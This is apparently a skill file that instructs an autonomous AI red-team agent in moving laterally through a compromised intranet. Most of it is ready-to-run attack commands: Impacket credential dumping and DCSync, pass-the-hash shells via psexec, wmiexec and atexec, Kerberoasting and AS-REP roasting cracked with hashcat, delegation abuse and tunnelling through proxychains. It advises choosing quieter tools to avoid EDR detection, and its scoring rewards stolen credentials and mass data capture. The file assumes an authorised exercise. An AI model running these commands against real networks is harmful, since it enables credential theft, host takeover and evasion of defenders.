---
name: lateral-movement
description: Intranet lateral movement and privilege escalation: Impacket suite (PtH/PsExec/WMI/DCOM/Kerberos/credential dumping) + enum4linux/smbclient enumeration
whenToUse: After entering the intranet, to move laterally to other hosts using existing credentials or hashes, enumerate domain environment, dump credentials, or find paths to domain controllers
role: internal
enabled: true
---

# Intranet lateral movement and privilege escalation (Impacket suite)

After gaining access to one machine and intranet reachability, **moving laterally to more hosts** (`server-host`) and **finding domain controllers/core systems** (`central-system`)
are the main objectives of the intranet phase. This machine has **61 `impacket-*` commands** installed (bundled with Kali), the primary toolkit for this phase.

## Local tools

| Tool | Path | Purpose |
| --- | --- | --- |
| Impacket suite | `/usr/bin/impacket-*` (61 commands) | Protocol-level lateral movement, credential dumping, Kerberos attacks |
| enum4linux | `/usr/bin/enum4linux` | SMB/domain enumeration (users, shares, policies) |
| smbclient | `/usr/bin/smbclient` | Share browsing and read/write |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS name scanning |
| proxychains4 | `/usr/bin/proxychains4` | Access intranet through tunnels (**use temporary config with `-f` only**) |

## 0. Do this first (information determines approach)

```bash
# 1) See what you have (credentials/hashes/domain info)
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) Enumerate domain environment (after obtaining domain account)
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # can enumerate users/shares/policies even without credentials

# 3) Shares and files
smbclient -L //<target> -N                                  # list shares with null session
smbclient //<target>/<share> -U <user>%<pass>               # read share
impacket-smbclient <domain>/<user>:<pass>@<target>          # interactive, supports cd/ls/get/put
```

**Still use gogo/fscan for intranet scanning** (skills `gogo-intranet` / `fscan-intranet`)—this skill focuses on "how to move after getting in".

## 1. Credential dumping (first priority after compromising a machine)

```bash
# 1) Remote dump SAM/LSA/SECRETS (requires admin credentials)
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # dump directly with hash

# 2) Dump local SAM only
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync (with domain admin/replication privileges, dump all domain hashes directly) — key step to domain controller
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) Capture plaintext/tickets: use target-side tools (e.g. mimikatz) or lsassy
#    Crack obtained hashes offline with credential-attack, or use PtH directly (below)
```

**Output handling**: add each dumped `NTLM` hash via `redteam_credential_add` (`source=credential dump`,
plaintext passwords go to `secret_value`, hashes go to `note` or `secret_value` with type noted), store files in `runs/`.

## 2. Pass-the-Hash (PtH, lateral movement without cracking)

```bash
# Command execution
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # interactive SYSTEM shell (noisy)
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # semi-interactive, quieter (recommended)
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # single command, quietest
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # execute via service

# File access
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# Database
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec creates services, is noisy, and may be blocked by AV**; prefer `wmiexec`/`atexec`.

## 3. Kerberos attacks (when in a domain environment)

```bash
# 1) Username enumeration + AS-REP roasting (no password needed; find accounts without pre-auth)
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # offline crack

# 2) Kerberoasting (find service accounts with SPN, capture TGS for offline cracking)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) Ticket request and use
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # request TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # lateral movement with ticket

# 4) Delegation attacks (domain privilege escalation paths)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 4. Credential reuse (much faster than attacks; always try first)

After obtaining any account/hash, **test it laterally first** instead of rushing to new exploits:
1. Try the same password on other hosts (`wmiexec` in batch) and other protocols (SMB/WinRM/RDP/SSH/MSSQL/MySQL);
2. Reuse local admin passwords (machines imaged in bulk often share passwords)—**often the highest-hit lateral move in intranets**;
3. Domain account → try all domain machines, shares, OA/mail/bastion/ops platform backends;
4. Hash → PtH to all reachable hosts (loop with `runs/hosts.txt`).

## 5. Tunnel coordination (when intranet targets are not directly reachable)

```bash
# Prefix all commands with proxychains4 using a temporary config (do not modify system config)
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ Note: proxychains only proxies TCP; UDP parts of Kerberos and some callback scenarios need chisel/frp port mapping
```

## 6. Discipline and boundaries

1. **Focus matters**: the intranet phase aims at **core systems** (domain controllers / bastion hosts / ops platforms / database clusters / code repos / backup systems),
   not compromising every machine. Lateral movement is a means; scoring points are `server-host` and `central-system`.
2. **Noise control**: `psexec` creates services, `secretsdump` touches LSASS—both attract EDR attention;
   prefer `wmiexec`/`atexec`, control frequency, and avoid brute lateral sweeps across entire segments.
3. **Do not lock yourself out**: repeated domain account failures trigger lockout policies; try existing credential reuse first, and follow rate-limit discipline from skill `credential-attack` for weak-password brute force.
4. **No destructive actions**: do not stop services, change system configs, or delete logs (unless the exercise explicitly requires it and the user agrees).
5. **Register every new host**: `redteam_asset_add` (intranet asset, `scope` auto-internal),
   successful access → `redteam_access_add`, credentials → `redteam_credential_add`.

## 7. Output and recording (required)

1. **Score each successfully compromised host**: `redteam_score_hit` (`server-host`), evidence should state
   "source host → target host:port | credential/hash used | execution result" (e.g. `10.0.0.5 → 10.0.0.9:445 | PtH local admin hash | whoami=nt authority\system`).
2. **Score core systems**: reaching domain controller/bastion/ops platform/database cluster → `central-system`;
   obtaining large volumes of data → `bigdata-system` (**must state actual record count, ≥1,000,000 to count**).
3. **Record credentials**: `redteam_credential_add`, clearly state `source` (`credential dump`/`Kerberoasting`/`AS-REP`/`credential reuse`/`offline crack`),
   put actual command text in `tool`, plaintext password in `secret_value`, file path in `secret_ref`.
4. **Record access sessions**: `redteam_access_add` (`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`).
5. For each key action, add `redteam_chain_add`: `stage_code=internal` (intranet access) or `target` (target access),
   **put actual command text in `tool`** (including key params like `-hashes`, `-k -no-pass`, and `proxychains4 -f ...` prefix),
   and output summary in `result`—reports must be reproducible.
6. **Feed back to knowledge base**: for verified effective generic exploitation scripts, add `redteam_poc_add` (with `category` + `engagement` + `asset_target` + `verified_note`, sanitized).
